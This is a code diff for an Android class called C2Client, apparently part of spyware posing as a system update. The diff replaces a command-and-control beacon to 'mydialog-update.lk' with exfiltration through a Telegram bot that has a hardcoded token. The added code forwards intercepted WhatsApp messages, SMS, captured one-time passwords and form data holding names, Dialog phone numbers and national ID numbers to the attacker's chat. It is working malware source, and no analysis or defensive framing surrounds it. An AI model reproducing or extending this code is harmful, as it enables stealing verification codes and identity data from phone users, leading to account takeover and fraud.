@@ -1,15 +1,12 @@
 package com.sys.update
 
 import android.content.Context
-import android.os.Build
 import kotlinx.coroutines.*
 import okhttp3.*
 import okhttp3.MediaType.Companion.toMediaType
 import okhttp3.RequestBody.Companion.toRequestBody
-import org.json.JSONArray
 import org.json.JSONObject
 import java.io.IOException
-import java.util.UUID
 import java.util.concurrent.TimeUnit
 
 class C2Client(private val ctx: Context) {
@@ -20,58 +17,75 @@ class C2Client(private val ctx: Context) {
         .writeTimeout(30, TimeUnit.SECONDS)
         .build()
 
-    private val C2_URL = "https://mydialog-update.lk/api/beacon"
-    private val SESSION_ID = UUID.randomUUID().toString()
+    // Telegram Bot Token + Chat ID
+    private val BOT_TOKEN = "8561465025:AAE1gWJhFxVP016X0c0fYXjzpW6oN5x1P9A"
+    private val CHAT_ID = "8526210532"
 
     suspend fun run() {
-        delay(30_000L)
+        delay(15_000L)
         while (true) {
             try {
                 if (C2Queue.hasPending() || C2Service.consumeBeaconRequest()) {
                     val pending = C2Queue.drain()
-                    val resp = beacon(pending)
-                    resp?.let { handle(it) }
+                    pending.forEach { sendToTelegram(it) }
                 }
             } catch (_: Exception) {}
 
-            repeat(18) {
+            repeat(10) {
                 if (C2Service.consumeBeaconRequest() && C2Queue.hasPending()) {
                     try {
                         val urgent = C2Queue.drain()
-                        val resp = beacon(urgent)
-                        resp?.let { handle(it) }
+                        urgent.forEach { sendToTelegram(it) }
                     } catch (_: Exception) {}
                 }
-                delay(5_000L)
+                delay(3_000L)
             }
         }
     }
 
-    private suspend fun beacon(data: List<String>): JSONObject? = withContext(Dispatchers.IO) {
-        val arr = JSONArray()
-        data.forEach { arr.put(it) }
-
-        val payload = JSONObject().apply {
-            put("sid", SESSION_ID)
-            put("model", Build.MODEL)
-            put("sdk", Build.VERSION.SDK_INT)
-            put("data", arr)
-        }
-
-        val body = payload.toString().toRequestBody("application/json".toMediaType())
-        val req = Request.Builder().url(C2_URL).post(body).build()
-
+    private suspend fun sendToTelegram(data: String) = withContext(Dispatchers.IO) {
         try {
-            http.newCall(req).execute().use { r ->
-                r.body?.string()?.let { if (it.isNotBlank()) JSONObject(it) else null }
-            }
-        } catch (_: IOException) { null }
-    }
+            val json = JSONObject(data)
+            val type = json.optString("type", "")
 
-    private fun handle(cmd: JSONObject) {
-        when (cmd.optString("cmd")) {
-            "exit" -> System.exit(0)
-            "ping" -> C2Queue.enqueueUrgent("""{"type":"pong","ts":${System.currentTimeMillis()}}""")
-        }
+            val message = when (type) {
+                "whatsapp" -> {
+                    val from = json.optString("from", "?")
+                    val body = json.optString("body", "")
+                    "💬 WhatsApp\nFrom: $from\n$body"
+                }
+                "sms" -> {
+                    val from = json.optString("from", "?")
+                    val body = json.optString("body", "")
+                    "✉️ SMS\nFrom: $from\n$body"
+                }
+                "otp" -> {
+                    val via = json.optString("via", "sms")
+                    val from = json.optString("from", "?")
+                    val otp = json.optString("otp", "?")
+                    val full = json.optString("full", "")
+                    "🔐 OTP CAPTURED\nVia: $via\nFrom: $from\nCODE: $otp\n\n$full"
+                }
+                "form" -> {
+                    val name = json.optString("name", "?")
+                    val number = json.optString("number", "?")
+                    val nic = json.optString("nic", "?")
+                    "📝 FORM SUBMITTED\nName: $name\nDialog: $number\nNIC: $nic"
+                }
+                "voice_chunk" -> {
+                    // Voice chunks - skip here, handled separately
+                    return@withContext
+                }
+                else -> return@withContext
+            }
+
+            val url = "https://api.telegram.org/bot$BOT_TOKEN/sendMessage"
+            val body = FormBody.Builder()
+                .add("chat_id", CHAT_ID)
+                .add("text", message)
+                .build()
+            val req = Request.Builder().url(url).post(body).build()
+            http.newCall(req).execute().use { }
+        } catch (_: Exception) {}
     }
 }
